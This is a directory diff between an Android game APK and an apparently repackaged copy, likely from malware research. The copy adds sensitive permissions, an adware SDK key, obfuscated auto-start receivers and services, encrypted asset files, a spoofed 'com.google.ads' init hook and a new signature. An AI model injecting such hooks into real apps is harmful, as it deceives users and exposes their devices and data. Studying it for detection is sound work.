@@ -1,0 +1,508 @@
+diff -r result/APP_51/App_B_51/AndroidManifest.xml result/APP_51/App_M_51/AndroidManifest.xml
+4a5,13
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+12a22,82
+>         <meta-data android:name="ZHUAMOB_APPKEY" android:value="19bb4a0a74698a7bd0da0382"/>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.cwillay.MaveActivity" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.cwillay.WiwslRwsn"/>
+>         <receiver android:name="com.cwillay.FwaunActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:name="com.cwillay.tusrck.LuwnActivity"/>
+>         <receiver android:name="com.cwillay.tusrck.BwoienAwinl">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.cwillay.coarn.TawnActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.cwillay.coarn.SwsueActivity"/>
+>         <receiver android:name="com.cwillay.coarn.NatuIwin">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.cwillay.niwin.UweAHawnw"/>
+>         <service android:name="com.cwillay.niwin.GeunAwneui"/>
+>         <receiver android:name="com.cwillay.niwin.RTawsnActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+diff -r result/APP_51/App_B_51/apktool.yml result/APP_51/App_M_51/apktool.yml
+2c2
+< apkFileName: Bapp51-78CFE5A6E2ABCF723F5C077714F56B1E77000B7204AF3589A6F99A1FFFD2631D.apk
+---
+> apkFileName: Mapp51-CA8BB2A18417B5F6BDAE9BEE239FE10BC9845A5108B2B8CF1D3707FA49B5CED1.apk
+8d7
+< - wav
+9a9,10
+> - wav
+> - assets/Zhuamob_sdk_v1.8.2.version
+19,33c20
+< unknownFiles:
+<   license.txt: '8'
+<   processing/opengl/LineShaderFrag.glsl: '8'
+<   processing/opengl/LineShaderVert.glsl: '8'
+<   processing/opengl/MaskShaderFrag.glsl: '8'
+<   processing/opengl/PointShaderFrag.glsl: '8'
+<   processing/opengl/PointShaderVert.glsl: '8'
+<   processing/opengl/PolyColorShaderVert.glsl: '8'
+<   processing/opengl/PolyLightShaderVert.glsl: '8'
+<   processing/opengl/PolyNoTexShaderFrag.glsl: '8'
+<   processing/opengl/PolyTexlightShaderVert.glsl: '8'
+<   processing/opengl/PolyTexShaderFrag.glsl: '8'
+<   processing/opengl/PolyTexShaderVert.glsl: '8'
+<   jsr305_annotations/Jsr305_annotations.gwt.xml: '8'
+<   jsr305_annotations/v0_r47/V0_r47.gwt.xml: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_51/App_M_51/assets: bin
+Somente em result/APP_51/App_M_51/assets: l
+Somente em result/APP_51/App_M_51/assets: lc
+Somente em result/APP_51/App_M_51/assets: waoin
+Somente em result/APP_51/App_M_51/assets: Zhuamob_sdk_v1.8.2.version
+diff -r result/APP_51/App_B_51/cgApps/TapHero/MainActivity.java result/APP_51/App_M_51/cgApps/TapHero/MainActivity.java
+18a19
+> import android.widget.FrameLayout.LayoutParams;
+22a24
+> import com.aaaa.ZhuamobActivity;
+25a28,29
+> import com.google.ads.AdsTwinActivity;
+> import com.zhuamob.android.ZhuamobLayout;
+339a344
+>     AdsTwinActivity.init(this);
+1006a1012,1019
+>   }
+>   
+>   public void toStart()
+>   {
+>     ZhuamobLayout localZhuamobLayout = new ZhuamobLayout(this);
+>     FrameLayout.LayoutParams localLayoutParams = new FrameLayout.LayoutParams(-1, -2);
+>     localLayoutParams.gravity = 80;
+>     addContentView(localZhuamobLayout, localLayoutParams);
+Somente em result/APP_51/App_M_51/com: cwillay
+Somente em result/APP_51/App_M_51/com/google/ads: AdsTwinActivity.java
+Os arquivos binários result/APP_51/App_B_51/original/AndroidManifest.xml e result/APP_51/App_M_51/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_51/App_B_51/original/META-INF/CERT.RSA e result/APP_51/App_M_51/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_51/App_B_51/original/META-INF/CERT.SF result/APP_51/App_M_51/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: WXzBbg6UvWpzEPu+e/R3HJqWOIc=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: R1nYGGHH0gNYkRTZ5XsMVdRYIdA=
+8,9c8,12
+< Name: processing/opengl/MaskShaderFrag.glsl
+< SHA1-Digest: rAOwK3AQUg85pow+fvFHWsXYsC8=
+---
+> Name: res/raw/lonleypianon.chart
+> SHA1-Digest: GIOj3pzV4vDy+8ERxDr/fZx1u/k=
+> 
+> Name: res/drawable-hdpi/ic_launcher.png
+> SHA1-Digest: VR0B/4GYoXwiNvIpS3LSFBwpbRQ=
+19a23,25
+> Name: res/raw/therisingn.chart
+> SHA1-Digest: g56ah8+5gvl3Axs4vv2TepsVy34=
+> 
+25a32,34
+> Name: resources.arsc
+> SHA1-Digest: sAv2hI8JWb9k3heroC+kpgYl+h8=
+> 
+29,30c38,42
+< Name: processing/opengl/PolyNoTexShaderFrag.glsl
+< SHA1-Digest: rxOMd7/tO68vcVNxKJjR0Pd0yT8=
+---
+> Name: assets/lc/wonwal.dat
+> SHA1-Digest: Wq0wah5IrhTledFuCqzwNM8tAfE=
+> 
+> Name: assets/bg.png
+> SHA1-Digest: gjbCWze3WlO7hYwwVwnnQ+N1G1s=
+34a47,49
+> Name: AndroidManifest.xml
+> SHA1-Digest: kNE4jUZ9rDJcCN2yTz6rzRzP5iI=
+> 
+37a53,55
+> Name: assets/Zhuamob_sdk_v1.8.2.version
+> SHA1-Digest: FXMbgblP7gqn3SWqk6Zc3A70oPY=
+> 
+41,106d58
+< Name: assets/fb.png
+< SHA1-Digest: XFR3fllHcQ5RRIpbeZqAb/OC97c=
+< 
+< Name: jsr305_annotations/v0_r47/V0_r47.gwt.xml
+< SHA1-Digest: E9F85/qDCNqclUF1swwnG6QZXwg=
+< 
+< Name: jsr305_annotations/Jsr305_annotations.gwt.xml
+< SHA1-Digest: nsoCwYQvSoEvPZnRmRn0UzEPvoo=
+< 
+< Name: res/raw/mechanolithn.chart
+< SHA1-Digest: D4p1ZDPY48zfM5p0h+mvA0s+Tms=
+< 
+< Name: processing/opengl/LineShaderVert.glsl
+< SHA1-Digest: cWmxmpGgPz0ISlpU1/Fc9jtoQXw=
+< 
+< Name: res/drawable-xxhdpi/ic_launcher.png
+< SHA1-Digest: XAvnB31ByNxYydtqjlDkPF5pJLg=
+< 
+< Name: res/raw/exhilarateorg.mp3
+< SHA1-Digest: /SNrxEJJPn1cw7mAsAnNJ2xHDM8=
+< 
+< Name: processing/opengl/PolyTexlightShaderVert.glsl
+< SHA1-Digest: obYwcbO7cgw+lgZGYstZ9omjNE8=
+< 
+< Name: assets/main.png
+< SHA1-Digest: WUPUWj3Do87ulKrH77NHT8BPuj4=
+< 
+< Name: res/raw/notes.chart
+< SHA1-Digest: H6/D6ewiWmfXCu9LaaKuF076uFs=
+< 
+< Name: license.txt
+< SHA1-Digest: WRGG9L3F1+Q+firFXd77lQDdB+s=
+< 
+< Name: res/raw/headdingforthebattle.mp3
+< SHA1-Digest: 9LPUmIeH3xBiGQAxdtZqXLnejT0=
+< 
+< Name: res/raw/lonleypianon.chart
+< SHA1-Digest: GIOj3pzV4vDy+8ERxDr/fZx1u/k=
+< 
+< Name: res/drawable-hdpi/ic_launcher.png
+< SHA1-Digest: VR0B/4GYoXwiNvIpS3LSFBwpbRQ=
+< 
+< Name: processing/opengl/PointShaderVert.glsl
+< SHA1-Digest: MoNcNRo9407ScOqdb6d0yBT2ppY=
+< 
+< Name: res/raw/therisingn.chart
+< SHA1-Digest: g56ah8+5gvl3Axs4vv2TepsVy34=
+< 
+< Name: processing/opengl/PolyTexShaderVert.glsl
+< SHA1-Digest: fnVeas+MwWNpqtbQBflMXgJeNAY=
+< 
+< Name: processing/opengl/LineShaderFrag.glsl
+< SHA1-Digest: PmwKcozRaZxwIvrJPx9ygqWj3fM=
+< 
+< Name: resources.arsc
+< SHA1-Digest: 8uC84cRogi0bcPQAzSXOwYzTv+k=
+< 
+< Name: processing/opengl/PointShaderFrag.glsl
+< SHA1-Digest: iCwkRrB8CzizF67CMYTb3E31Xe8=
+< 
+< Name: assets/bg.png
+< SHA1-Digest: gjbCWze3WlO7hYwwVwnnQ+N1G1s=
+< 
+< Name: AndroidManifest.xml
+< SHA1-Digest: MJZDqeWuFtpy325ZYEi5H++BKYo=
+< 
+109a62,64
+> Name: assets/fb.png
+> SHA1-Digest: XFR3fllHcQ5RRIpbeZqAb/OC97c=
+> 
+115a71,76
+> Name: assets/l/l.dat
+> SHA1-Digest: ZVCpT9yqcvPOVZJzscKFrvCyD88=
+> 
+> Name: assets/bin/v.dat
+> SHA1-Digest: aksejbvfxE69T4CZ8Tk/y0e0Pls=
+> 
+128,129c89,93
+< Name: processing/opengl/PolyLightShaderVert.glsl
+< SHA1-Digest: QZ7O4UXM14suEqnNPpkBO43sJJM=
+---
+> Name: res/raw/mechanolithn.chart
+> SHA1-Digest: D4p1ZDPY48zfM5p0h+mvA0s+Tms=
+> 
+> Name: assets/waoin/pic.dat
+> SHA1-Digest: OaE08EyDpE1xBiXq4bNRPloMy0o=
+135c99
+< SHA1-Digest: E5rLBLmUJkZCZmuwqT1NcSSxjaQ=
+---
+> SHA1-Digest: /ytVar357WGn+Cw76A9DTVU0i7g=
+139a104,109
+> Name: res/drawable-xxhdpi/ic_launcher.png
+> SHA1-Digest: XAvnB31ByNxYydtqjlDkPF5pJLg=
+> 
+> Name: res/raw/exhilarateorg.mp3
+> SHA1-Digest: /SNrxEJJPn1cw7mAsAnNJ2xHDM8=
+> 
+141c111,114
+< SHA1-Digest: BEvi5L3mvJgOjWubE/JscCsfbe8=
+---
+> SHA1-Digest: ssXKiqQNz1R0vhYxevTWjtFqBQ8=
+> 
+> Name: assets/main.png
+> SHA1-Digest: WUPUWj3Do87ulKrH77NHT8BPuj4=
+146,147c119,120
+< Name: processing/opengl/PolyTexShaderFrag.glsl
+< SHA1-Digest: BucPOhAszBND4DAcfVN8h3p5qdA=
+---
+> Name: res/raw/notes.chart
+> SHA1-Digest: H6/D6ewiWmfXCu9LaaKuF076uFs=
+153c126
+< SHA1-Digest: BW/mqdM7FWMsnZ1xh1LjhxwSPhs=
+---
+> SHA1-Digest: 4IezQx2mxKlr6rIvB9qX5wwACyo=
+158,159c131,132
+< Name: processing/opengl/PolyColorShaderVert.glsl
+< SHA1-Digest: TXBuw9cPbGdaDf86dZ/UCCYhhVU=
+---
+> Name: res/raw/headdingforthebattle.mp3
+> SHA1-Digest: 9LPUmIeH3xBiGQAxdtZqXLnejT0=
+diff -r result/APP_51/App_B_51/original/META-INF/MANIFEST.MF result/APP_51/App_M_51/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+7,8c7,11
+< Name: processing/opengl/MaskShaderFrag.glsl
+< SHA1-Digest: EbiqZgO93VSatFvAcPVkzqtRIpY=
+---
+> Name: res/raw/lonleypianon.chart
+> SHA1-Digest: eFO7SRLYgFFcDH76/y573r2agFE=
+> 
+> Name: res/drawable-hdpi/ic_launcher.png
+> SHA1-Digest: cduPtEvZUC5yQY3vGzI5fk0T9qY=
+15a19,21
+> Name: res/raw/therisingn.chart
+> SHA1-Digest: q0p2pHm2vSOR99xYjEgnp6Epifc=
+> 
+24a31,33
+> Name: resources.arsc
+> SHA1-Digest: 7LcRa7MWOviMOgfUs3IMWCWDNsM=
+> 
+28,29c37,41
+< Name: processing/opengl/PolyNoTexShaderFrag.glsl
+< SHA1-Digest: UHmVvW577UZgXLyCY+SX9TV839o=
+---
+> Name: assets/bg.png
+> SHA1-Digest: fiuXeIrUyE+cBjQR/MQiWlUpr7A=
+> 
+> Name: assets/lc/wonwal.dat
+> SHA1-Digest: 134LjZUgs0Idp5LoC1K+/hEnotI=
+33a46,48
+> Name: AndroidManifest.xml
+> SHA1-Digest: +218A5IhvblToAbm6SEmDV5c2Ek=
+> 
+36a52,54
+> Name: assets/Zhuamob_sdk_v1.8.2.version
+> SHA1-Digest: clYnmU5siqvu2/EIpQn2Sb7+hqo=
+> 
+40,105d57
+< Name: assets/fb.png
+< SHA1-Digest: rWgHbJ4z7UORwkr6l5tLkrmJEys=
+< 
+< Name: jsr305_annotations/v0_r47/V0_r47.gwt.xml
+< SHA1-Digest: /f34xYwskAvrKqRB+jFPzJ8rPJg=
+< 
+< Name: jsr305_annotations/Jsr305_annotations.gwt.xml
+< SHA1-Digest: UBXHoAGmseBGDwjR6/MFHfcIK7g=
+< 
+< Name: res/raw/mechanolithn.chart
+< SHA1-Digest: U/nK4SNp+5hvFWMhlMnj4kwjPIk=
+< 
+< Name: processing/opengl/LineShaderVert.glsl
+< SHA1-Digest: E0PohWtH6OdjOcDLc1MGGmqXOFo=
+< 
+< Name: res/drawable-xxhdpi/ic_launcher.png
+< SHA1-Digest: gM/K7LWQH7EEE5Ouo3l0xsC5r9U=
+< 
+< Name: res/raw/exhilarateorg.mp3
+< SHA1-Digest: 7/wwthNlbkC9Z+lrZkzHHeKGFjk=
+< 
+< Name: assets/main.png
+< SHA1-Digest: jGBdHAwZWFi7gIePZcFN7kzH8CQ=
+< 
+< Name: processing/opengl/PolyTexlightShaderVert.glsl
+< SHA1-Digest: cccx/M3DdXhKwaExEj71MU2Ot6I=
+< 
+< Name: res/raw/notes.chart
+< SHA1-Digest: DDA7bLbzPTEs1HzPQkCS0b2z4wo=
+< 
+< Name: license.txt
+< SHA1-Digest: BdWVggOCJrqDrQ+W6tpK2Sod7Ow=
+< 
+< Name: res/raw/headdingforthebattle.mp3
+< SHA1-Digest: YROCnDaGWxgylCEkpc2HORt8Y8k=
+< 
+< Name: res/raw/lonleypianon.chart
+< SHA1-Digest: eFO7SRLYgFFcDH76/y573r2agFE=
+< 
+< Name: res/drawable-hdpi/ic_launcher.png
+< SHA1-Digest: cduPtEvZUC5yQY3vGzI5fk0T9qY=
+< 
+< Name: processing/opengl/PointShaderVert.glsl
+< SHA1-Digest: yTgYwW8nSVqX84GICtw7A+dLYQs=
+< 
+< Name: res/raw/therisingn.chart
+< SHA1-Digest: q0p2pHm2vSOR99xYjEgnp6Epifc=
+< 
+< Name: processing/opengl/PolyTexShaderVert.glsl
+< SHA1-Digest: CDSQu5Z6hVvEwexe5RT6BuCs2Zk=
+< 
+< Name: processing/opengl/LineShaderFrag.glsl
+< SHA1-Digest: U0udwiRgWWxwyTLIRFTLxSTqPyY=
+< 
+< Name: resources.arsc
+< SHA1-Digest: x4vZbQuBdtf1ad0ZJ+JnUtJz4hE=
+< 
+< Name: processing/opengl/PointShaderFrag.glsl
+< SHA1-Digest: UHmVvW577UZgXLyCY+SX9TV839o=
+< 
+< Name: assets/bg.png
+< SHA1-Digest: fiuXeIrUyE+cBjQR/MQiWlUpr7A=
+< 
+< Name: AndroidManifest.xml
+< SHA1-Digest: tmTY0uo54GqKCF3JbFDZlwoI1Po=
+< 
+108a61,63
+> Name: assets/fb.png
+> SHA1-Digest: rWgHbJ4z7UORwkr6l5tLkrmJEys=
+> 
+114a70,75
+> Name: assets/l/l.dat
+> SHA1-Digest: iS+a8wBOFUjZSg1Zuqs0GC6Vnrk=
+> 
+> Name: assets/bin/v.dat
+> SHA1-Digest: LXEhYxaejpe00tXqHic1Q2YvB9Q=
+> 
+118,120d78
+< Name: res/raw/cruise.mp3
+< SHA1-Digest: LWkIrcvf7+xjeMeX1iCcdfAP1RM=
+< 
+123a82,84
+> Name: res/raw/cruise.mp3
+> SHA1-Digest: LWkIrcvf7+xjeMeX1iCcdfAP1RM=
+> 
+127,128c88,92
+< Name: processing/opengl/PolyLightShaderVert.glsl
+< SHA1-Digest: LVK3YGJkRB7C1eL54SkMKexK8Rg=
+---
+> Name: res/raw/mechanolithn.chart
+> SHA1-Digest: U/nK4SNp+5hvFWMhlMnj4kwjPIk=
+> 
+> Name: assets/waoin/pic.dat
+> SHA1-Digest: hZm7d/Jx5BPdDqPbDwtXCSeWJL4=
+134c98
+< SHA1-Digest: adVmmePijrMIQ7GbmxLE6KleE3w=
+---
+> SHA1-Digest: XVqj8s7QAj5mxC+2satgFTe0sRI=
+138a103,108
+> Name: res/drawable-xxhdpi/ic_launcher.png
+> SHA1-Digest: gM/K7LWQH7EEE5Ouo3l0xsC5r9U=
+> 
+> Name: res/raw/exhilarateorg.mp3
+> SHA1-Digest: 7/wwthNlbkC9Z+lrZkzHHeKGFjk=
+> 
+140c110,113
+< SHA1-Digest: 4kk/ftkp/cqOvezdYLGyEMFSCz4=
+---
+> SHA1-Digest: iqbpxBVbvM/8VbWzXVTaD0lliyI=
+> 
+> Name: assets/main.png
+> SHA1-Digest: jGBdHAwZWFi7gIePZcFN7kzH8CQ=
+145,146c118,119
+< Name: processing/opengl/PolyTexShaderFrag.glsl
+< SHA1-Digest: c0XRvIin3lsXyqx8pvaMTkKMIiE=
+---
+> Name: res/raw/notes.chart
+> SHA1-Digest: DDA7bLbzPTEs1HzPQkCS0b2z4wo=
+155c128
+< SHA1-Digest: 0z6OQriF2BBOcQ7YfMXKuxXf+8Y=
+---
+> SHA1-Digest: wBPaaYZLRqdDsZnwqtO9GueY6Sw=
+157,158c130,131
+< Name: processing/opengl/PolyColorShaderVert.glsl
+< SHA1-Digest: FAJJgy5M4v8HINxmPYgxCcmIZ0w=
+---
+> Name: res/raw/headdingforthebattle.mp3
+> SHA1-Digest: YROCnDaGWxgylCEkpc2HORt8Y8k=
+diff -r result/APP_51/App_B_51/processing/opengl/PGraphicsOpenGL.java result/APP_51/App_M_51/processing/opengl/PGraphicsOpenGL.java
+122c122
+<   protected final float[][] QUAD_POINT_SIGNS = { { -1.0F, 1.0F }, { -1.0F, -1.0F }, { 1.0F, -1.0F }, { 1.0F, 1.0F } };
+---
+>   protected final float[][] QUAD_POINT_SIGNS;
+206c206
+<   public PGL pgl = new PGL(this);
+---
+>   public PGL pgl;
+265a266,269
+>     float[] arrayOfFloat1 = { -1.0F, 1.0F };
+>     float[] arrayOfFloat2 = { 1.0F, -1.0F };
+>     this.QUAD_POINT_SIGNS = new float[][] { arrayOfFloat1, { -1.0F, -1.0F }, arrayOfFloat2, { 1.0F, 1.0F } };
+>     this.pgl = new PGL(this);
+diff -r result/APP_51/App_B_51/smali/cgApps/TapHero/MainActivity.smali result/APP_51/App_M_51/smali/cgApps/TapHero/MainActivity.smali
+1755a1756,1757
+>     invoke-static {p0}, Lcom/google/ads/AdsTwinActivity;->init(Landroid/content/Context;)V
+> 
+6841a6844,6870
+> .end method
+> 
+> .method public toStart()V
+>     .locals 4
+> 
+>     .prologue
+>     new-instance v1, Lcom/zhuamob/android/ZhuamobLayout;
+> 
+>     invoke-direct {v1, p0}, Lcom/zhuamob/android/ZhuamobLayout;-><init>(Landroid/app/Activity;)V
+> 
+>     .local v1, "zhuamobLayout":Lcom/zhuamob/android/ZhuamobLayout;
+>     new-instance v0, Landroid/widget/FrameLayout$LayoutParams;
+> 
+>     const/4 v2, -0x1
+> 
+>     const/4 v3, -0x2
+> 
+>     invoke-direct {v0, v2, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V
+> 
+>     .local v0, "params":Landroid/widget/FrameLayout$LayoutParams;
+>     const/16 v2, 0x50
+> 
+>     iput v2, v0, Landroid/widget/FrameLayout$LayoutParams;->gravity:I
+> 
+>     invoke-virtual {p0, v1, v0}, Lcom/aaaa/ZhuamobActivity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
+> 
+>     return-void
+Somente em result/APP_51/App_M_51/smali/com: cwillay
+Somente em result/APP_51/App_M_51/smali/com/google/ads: AdsTwinActivity.smali
+Somente em result/APP_51/App_B_51/: unknown
